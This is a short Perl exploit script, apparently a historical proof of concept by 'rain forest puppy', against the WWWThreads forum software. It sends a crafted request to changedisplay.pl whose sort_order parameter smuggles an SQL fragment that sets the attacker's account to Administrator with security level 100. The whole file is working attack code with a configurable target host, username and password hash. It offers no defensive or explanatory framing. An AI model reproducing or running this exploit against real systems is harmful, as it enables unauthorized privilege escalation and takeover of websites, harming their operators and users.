#!/usr/bin/perl
# wwwthreads hack by rfp@wiretrip.net
# elevate a user to admin status
#
# by rain forest puppy / rfp@wiretrip.net
use Socket;

#####################################################
# modify these

# can be DNS or IP address
$ip="localhost";

$username="rfp";
# remember to put a '\' before the '$' characters
$passhash="\$1\$V2\$sadklfjasdkfhjaskdjflh";

#####################################################

$parms="Cat=&Username=$username&Oldpass=$passhash".
"&sort_order=5,U_Status%3d'Administrator',U_Security%3d100".
"&display=threaded&view=collapsed&PostsPer=10".
"&Post_Format=top&Preview=on&TextCols=60&TextRows=5&FontSize=0".
"&FontFace=&PictureView=on&PicturePost=off";

$tosend="GET /cgi-bin/wwwthreads/changedisplay.pl?$parms HTTP/1.0\r\n".
"Referer: http://$ip/cgi-bin/wwwthreads/previewpost.pl\r\n\r\n";

print sendraw($tosend);

sub sendraw {
        my ($pstr)=@_; my $target;
        $target= inet_aton($ip) || die("inet_aton problems");
        socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp')||0) ||
                die("Socket problems\n");
        if(connect(S,pack "SnA4x8",2,80,$target)){
                select(S);              $|=1;
                print $pstr;            my @in=<S>;
                select(STDOUT);         close(S);
                return @in;
        } else { die("Can't connect...\n"); }}

